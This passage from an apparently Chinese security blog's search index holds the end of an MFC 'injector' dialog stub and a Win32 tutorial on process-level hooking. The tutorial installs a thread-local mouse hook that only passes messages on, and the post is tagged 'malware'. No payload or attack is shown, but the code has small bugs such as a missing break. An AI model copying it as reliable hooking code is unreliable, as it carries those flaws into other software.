AfxEnableControlContainer(); // 创建 shell 管理器，以防对话框包含 // 任何 shell 树视图控件或 shell 列表视图控件。 CShellManager *pShellManager = new CShellManager; // 激活“Windows Native”视觉管理器，以便在 MFC 控件中启用主题 CMFCVisualManager::SetDefaultManager(RUNTIME_CLASS(CMFCVisualManagerWindows)); // 标准初始化 // 如果未使用这些功能并希望减小 // 最终可执行文件的大小，则应移除下列 // 不需要的特定初始化例程 // 更改用于存储设置的注册表项 // TODO: 应适当修改该字符串， // 例如修改为公司或组织名 SetRegistryKey(_T(&quot;应用程序向导生成的本地应用程序&quot;)); CInjectorDlg dlg; m_pMainWnd = &amp;dlg; INT_PTR nResponse = dlg.DoModal(); if (nResponse == IDOK) &#123; // TODO: 在此放置处理何时用 // “确定”来关闭对话框的代码 &#125; else if (nResponse == IDCANCEL) &#123; // TODO: 在此放置处理何时用 // “取消”来关闭对话框的代码 &#125; else if (nResponse == -1) &#123; TRACE(traceAppMsg, 0, &quot;警告: 对话框创建失败，应用程序将意外终止。\\n&quot;); TRACE(traceAppMsg, 0, &quot;警告: 如果您在对话框上使用 MFC 控件，则无法 #define _AFX_NO_MFC_CONTROLS_IN_DIALOGS。\\n&quot;); &#125; // 删除上面创建的 shell 管理器。 if (pShellManager != nullptr) &#123; delete pShellManager; &#125;#if !defined(_AFXDLL) &amp;&amp; !defined(_AFX_NO_MFC_CONTROLS_IN_DIALOGS) ControlBarCleanUp();#endif // 由于对话框已关闭，所以将返回 FALSE 以便退出应用程序， // 而不是启动应用程序的消息泵。 return FALSE;&#125; Hook编程（进程Hook） 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153#include &lt;windows.h&gt;LRESULT CALLBACK WindowProc( //CALLBACK 从右向左入栈 //LRESULT long //该函数处理窗口消息 HWND hWnd,//窗口句柄类型 UINT uMsg,//unsigned int, 消息 WPARAM wParam,//unsigned int LPARAM lParam //long int);HHOOK MouseHook;//鼠标钩子处理函数LRESULT CALLBACK MouseProc(int nCode, WPARAM wParam, LPARAM lParam);int WINAPI WinMain( //窗口应用GUI HINSTANCE hInstance, //当前程序的实例句柄 //HINSTANCE ：实例句柄类型 HINSTANCE hPreInstance, //为了兼容16位应用程序，永远为空 LPSTR lpCmdLine, //命令行参数 //LPSTR：char * int nCmdShow //窗口的显示方式)&#123; //1.做一个窗口 //1.1设计窗口类 Spy++ TCHAR szAppClassName[] = TEXT(&quot;Joe1sn&quot;);//自动适应字符集 WNDCLASS wndClass = &#123; 0 &#125;; wndClass.hbrBackground = (HBRUSH)GetStockObject(WHITE_BRUSH);//加载白色画刷 wndClass.hCursor = LoadCursor(NULL, IDC_ARROW);//加载光标 wndClass.hInstance = hInstance;//当前窗口实例句柄 wndClass.lpfnWndProc = WindowProc;//窗口处理函数 wndClass.lpszClassName = szAppClassName;//窗口类型 wndClass.style = CS_HREDRAW | CS_VREDRAW; //窗口类的风格 //1.2注册窗口类 RegisterClass(&amp;wndClass); //1.3创建窗口类 HWND hWnd = CreateWindow(szAppClassName, TEXT(&quot;Test&quot;), WS_BORDER | WS_CAPTION | WS_SYSMENU | WS_MAXIMIZEBOX | WS_MINIMIZEBOX, 500, 200, 800, 600, NULL, NULL, hInstance, NULL ); //1.4显示和更新窗口 ShowWindow(hWnd,SW_SHOW);//显示 UpdateWindow(hWnd);//更新窗口 //1.5消息循环 //（参考QT的信号和槽?） //应用程序-&gt;操作系统-&gt;消息队列-&gt;应用程序 MSG msg; while (GetMessage(&amp;msg,NULL,0,0))//所有消息都要获取 //WM_QIT，返回0，结束循环 &#123; //将虚拟键消息转为字符消息 //windows只能识别虚拟键值 VK_UP VK_DOWN TranslateMessage(&amp;msg); //将消息分发给窗口处理函数 //这里是WinProc DispatchMessage(&amp;msg); &#125; return 0;&#125;//鼠标钩子处理函数LRESULT CALLBACK MouseProc(int nCode, WPARAM wParam, LPARAM lParam)&#123; //int x = LOWORD(lParam); //int y = HIWORD(lParam); //x += 100; //lParam = MAKELONG(x,y); /*if (wParam == VK_F2) &#123; SendMessage(hWnd, WM_CLOSE, 0, 0); UnhookWindowsHookW(MouseHook); &#125;*/ return CallNextHookEx(MouseHook,nCode,wParam,lParam);//向下传递 //return 1;//返回非0，表示消息已被处理，这样系统就不会把这个消息传递给程序&#125;LRESULT CALLBACK WindowProc(HWND hWnd,UINT uMsg,WPARAM wParam,LPARAM lParam)&#123; PAINTSTRUCT ps;// HDC hDC;//绘图DC switch (uMsg) &#123; //进程类hook case WM_CREATE://窗口创建消息 &#123; //安装hook MouseHook = SetWindowsHookEx(WH_MOUSE, MouseProc, NULL, GetCurrentThreadId()); break; &#125; case WM_CLOSE://窗口关闭消息 DestroyWindow(hWnd); break; case WM_DESTROY://窗口销毁消息 PostQuitMessage(0);//发送WM_QUIT就会退出 case WM_PAINT://窗口绘图消息 &#123; hDC = BeginPaint(hWnd, &amp;ps); HPEN hPen = CreatePen(PS_SOLID, 5, RGB(255, 0, 0)); SelectObject(hDC, hPen); Ellipse(hDC, 0, 0, 200, 200); EndPaint(hWnd, &amp;ps); &#125; case WM_LBUTTONDOWN://鼠标左键点击消息 &#123; MessageBox(hWnd, TEXT(&quot;Left&quot;), TEXT(&quot;Titile&quot;), MB_OK); break; &#125; case WM_RBUTTONDOWN://鼠标右键点击消息 &#123; MessageBox(hWnd, TEXT(&quot;Right&quot;), TEXT(&quot;Titile&quot;), MB_OK); break; &#125; case WM_MOUSEMOVE: &#123; int x = LOWORD(lParam); int y = HIWORD(lParam); wchar_t str[0x100]; wsprintf(str, L&quot;当前鼠标坐标(%d , %d)&quot;,x,y); //SetWindowText(hWnd, TEXT(&quot;In&quot;)); SetWindowText(hWnd, str); &#125; &#125; return DefWindowProc(hWnd, uMsg, wParam, lParam);&#125;","categories":[{"name":"program","slug":"program","permalink":"https://joe1sn.eu.org/categories/program/"}],"tags":[{"name":"malware","slug":"malware","permalink":"https://joe1sn.eu.org/tags/malware/"},{"name":"C","slug":"C","permalink":"https://joe1sn.eu.org/tags/C/"}]}],"categories":[{"name":"CVE","slug":"CVE","permalink":"https://joe1sn.eu.org/categories/CVE/"},{"name":"program","slug":"program","permalink":"https://joe1sn.eu.org/categories/program/"},{"name":"notes","slug":"notes","permalink":"https://joe1sn.eu.org/categories/notes/"},{"name":"writeup","slug":"writeup","permalink":"https://joe1sn.eu.org/categories/writeup/"},{"name":"kernel","slug":"notes/kernel","permalink":"https://joe1sn.eu.org/categories/notes/kernel/"},{"name":"os","slug":"notes/os","permalink":"https://joe1sn.eu.org/categories/notes/os/"},{"name":"misc","slug":"misc","permalink":"https://joe1sn.eu.org/categories/misc/"},{"name":"pentest","slug":"pentest","permalink":"https://joe1sn.eu.org/categories/pentest/"},{"name":"java","slug":"notes/java","permalink":"https://joe1sn.eu.org/categories/notes/java/"}],"tags":[{"name":"CVE","slug":"CVE","permalink":"https://joe1sn.eu.org/tags/CVE/"},{"name":"fuzz","slug":"fuzz","permalink":"https://joe1sn.eu.org/tags/fuzz/"},{"name":"malware","slug":"malware","permalink":"https://joe1sn.eu.org/tags/malware/"},{"name":"C","slug":"C","permalink":"https://joe1sn.eu.org/tags/C/"},{"name":"windows","slug":"windows","permalink":"https://joe1sn.eu.org/tags/windows/"},{"name":"pwn","slug":"pwn","permalink":"https://joe1sn.eu.org/tags/pwn/"},{"name":"CTF","slug":"CTF","permalink":"https://joe1sn.eu.org/tags/CTF/"},{"name":"writeup","slug":"writeup","permalink":"https://joe1sn.eu.org/tags/writeup/"},{"name":"cpp","slug":"cpp","permalink":"https://joe1sn.eu.org/tags/cpp/"},{"name":"kernel","slug":"kernel","permalink":"https://joe1sn.eu.org/tags/kernel/"},{"name":"muud","slug":"muud","permalink":"https://joe1sn.eu.org/tags/muud/"},{"name":"web framework","slug":"web-framework","permalink":"https://joe1sn.eu.org/tags/web-framework/"},{"name":"notes","slug":"notes","permalink":"https://joe1sn.eu.org/tags/notes/"},{"name":"git","slug":"git","permalink":"https://joe1sn.eu.org/tags/git/"},{"name":"os","slug":"os","permalink":"https://joe1sn.eu.org/tags/os/"},{"name":"misc","slug":"misc","permalink":"https://joe1sn.eu.org/tags/misc/"},{"name":"渗透","slug":"渗透","permalink":"https://joe1sn.eu.org/tags/%E6%B8%97%E9%80%8F/"},{"name":"dbg","slug":"dbg","permalink":"https://joe1sn.eu.org/tags/dbg/"},{"name":"Windows","slug":"Windows","permalink":"https://joe1sn.eu.org/tags/Windows/"},{"name":"Java","slug":"Java","permalink":"https://joe1sn.eu.org/tags/Java/"}]}